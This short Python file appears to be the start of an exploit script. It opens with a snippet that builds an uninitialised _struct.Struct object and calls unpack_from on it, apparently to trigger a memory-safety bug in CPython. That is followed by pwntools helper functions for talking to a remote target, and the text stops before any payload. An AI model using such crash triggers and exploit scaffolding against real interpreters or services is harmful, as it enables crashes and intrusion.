from _struct import Struct
s = Struct.__new__(Struct)
s.format = "<i"
s.size = 4
s.unpack_from(b'\x00\x00\x00\x00')

# Exploit

from pwn import *
from time import sleep
from hashlib import sha256

#context.log_level = 'debug'

def send_msg(conn, msg):
    recv_until(conn, "> ")
    conn.sendline(msg)

def send_int(conn, num):
    recv_until(conn, "> ")
    conn.sendline(str(num))

def send_data(conn, data):
    recv_until(conn, "> ")
    conn.send(data)

def recv_until(conn, s):
    data = ""
    while s not in data:
        data += conn.recv(1)
    return data

def recv_until_str(conn, s):
    data = ""
    while s not in data:
        data += conn.recv(1)
